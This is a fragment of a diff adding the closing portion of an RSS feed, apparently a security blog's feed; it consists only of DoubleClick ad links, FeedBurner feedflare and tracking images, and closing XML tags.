+<p><a href="http://feedads.g.doubleclick.net/~a/eg65GVOdDudSbI0KcglantDDM3w/0/da"><img src="http://feedads.g.doubleclick.net/~a/eg65GVOdDudSbI0KcglantDDM3w/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/eg65GVOdDudSbI0KcglantDDM3w/1/da"><img src="http://feedads.g.doubleclick.net/~a/eg65GVOdDudSbI0KcglantDDM3w/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=hnoyhXLlp-Y:xHgzgirqRqU:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/hnoyhXLlp-Y" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>0</slash:comments>
+    </item>
+  </channel>
+</rss>
+
